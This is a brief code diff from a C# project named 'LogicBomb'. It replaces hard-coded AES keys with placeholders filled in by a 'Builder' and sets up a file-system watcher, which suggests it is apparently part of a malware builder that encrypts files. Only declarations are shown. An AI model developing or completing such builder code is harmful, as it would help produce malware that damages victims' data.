@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -25,8 +25,8 @@ namespace LogicBomb
         private const int FileReadyTimeoutSec = 5;
 
         // AES encryption keys (will be replaced by Builder)
-        private static readonly byte[] AES_KEY = new byte[] { 0x49, 0xB2, 0x6E, 0x43, 0x84, 0x2E, 0x12, 0xBB, 0xCC, 0xD4, 0xEB, 0xCC, 0xDD, 0xF9, 0xDF, 0x0F, 0x8D, 0x22, 0x60, 0x4F, 0x46, 0xC2, 0x6C, 0x80, 0xD2, 0x78, 0x2B, 0x40, 0xB5, 0x94, 0xDF, 0x2E };
-        private static readonly byte[] AES_IV = new byte[] { 0xBA, 0x3E, 0x7D, 0xC9, 0xDC, 0xFA, 0x29, 0x67, 0x1C, 0x6D, 0xE6, 0x04, 0x22, 0x4C, 0x5C, 0x23 };
+        private static readonly byte[] AES_KEY = new byte[] { /*{{AES_KEY}}*/ };
+        private static readonly byte[] AES_IV = new byte[] { /*{{AES_IV}}*/ };
 
         private static FileSystemWatcher watcher;
         private static ConcurrentDictionary<string, DateTime> pending = new ConcurrentDictionary<string, DateTime>(StringComparer.OrdinalIgnoreCase);
